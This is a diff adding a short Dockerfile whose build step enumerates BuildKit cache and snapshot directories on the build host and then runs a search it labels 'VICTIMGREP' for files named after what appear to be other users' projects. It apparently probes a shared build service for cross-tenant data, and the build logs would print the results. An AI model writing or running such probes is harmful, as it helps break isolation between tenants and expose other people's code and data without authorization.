@@ -1,0 +1,8 @@
+FROM alpine:3.19
+RUN echo "===CACHETOP===" ; ls -la /cache 2>&1 | head -20 ; echo "===BUILDKIT===" ; ls -la /cache/buildkit 2>&1 | head -20 ; \
+    echo "===SNAPS===" ; ls /cache/buildkit/runc-overlayfs/snapshots/snapshots 2>&1 | head -60 ; \
+    echo "===ROOT===" ; ls -la / ; echo "===PERSIST===" ; ls -la /persist 2>&1 | head ; \
+    echo "===VARLIB===" ; ls -la /var/lib/buildkit 2>&1 | head ; \
+    echo "===VICTIMGREP===" ; find / -maxdepth 7 -iname '*ysws-ari*' -o -maxdepth 7 -iname '*orchard-testin*' 2>/dev/null | head ; \
+    echo "===DF===" ; df -h 2>&1 | head ; echo "===DONE==="
+CMD ["sh","-c","sleep 15"]
